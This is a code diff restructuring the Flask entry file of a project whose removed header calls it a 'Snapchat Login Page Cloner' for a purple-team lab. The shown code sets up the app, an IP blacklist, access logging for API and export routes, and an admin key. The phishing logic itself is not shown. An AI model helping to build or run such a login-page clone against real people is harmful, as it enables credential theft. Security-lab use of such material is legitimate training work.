@@ -1,12 +1,55 @@
-"""
-Snapchat Login Page Cloner — Version Purple Team Lab
-Refactored into app/ package. This file is a compatibility shim.
-"""
 import os
 import sys
-from app import app, create_app
-from app.config import CONFIG, BASE_DIR
-from app.database import init_database
+import secrets
+from datetime import datetime
+
+from flask import Flask, request, jsonify
+
+from .config import CONFIG, BASE_DIR, ADMIN_KEY_FILE
+from .database import init_database, log_access, is_blacklisted
+from .routes import blueprints
+
+sys.stdout.reconfigure(encoding='utf-8')
+
+app = Flask(__name__,
+            template_folder=os.path.join(BASE_DIR, "templates"),
+            static_folder=os.path.join(BASE_DIR, "static"))
+app.secret_key = secrets.token_hex(32)
+app.config['SESSION_COOKIE_HTTPONLY'] = True
+app.config['SESSION_COOKIE_SECURE'] = CONFIG["USE_HTTPS"]
+app.config['TEMPLATES_AUTO_RELOAD'] = True
+
+if CONFIG["USE_HTTPS"]:
+    try:
+        import cryptography
+    except ImportError:
+        print("[!] cryptography non installe. HTTPS desactive.")
+        print("    pip install cryptography")
+        CONFIG["USE_HTTPS"] = False
+
+for bp in blueprints:
+    app.register_blueprint(bp)
+
+
+@app.before_request
+def check_blacklist():
+    if request.path == '/' or request.path.startswith('/static/'):
+        return None
+    if is_blacklisted(request.remote_addr):
+        return jsonify({"error": "blocked", "message": "Your IP has been blacklisted"}), 403
+
+
+@app.after_request
+def log_api_access(response):
+    if request.path.startswith('/api/') or request.path.startswith('/export/'):
+        log_access(request.remote_addr, request.path, request.method, response.status_code)
+    return response
+
+
+def create_app():
+    init_database()
+    return app
+
 
 if __name__ == '__main__':
     init_database()
@@ -17,7 +60,6 @@ if __name__ == '__main__':
     print("")
     print("=" * 60)
     print(f"  ADMIN KEY: {CONFIG['ADMIN_KEY']}")
-    from app.config import ADMIN_KEY_FILE
     print(f"  (saved in {ADMIN_KEY_FILE})")
     print("=" * 60)
 
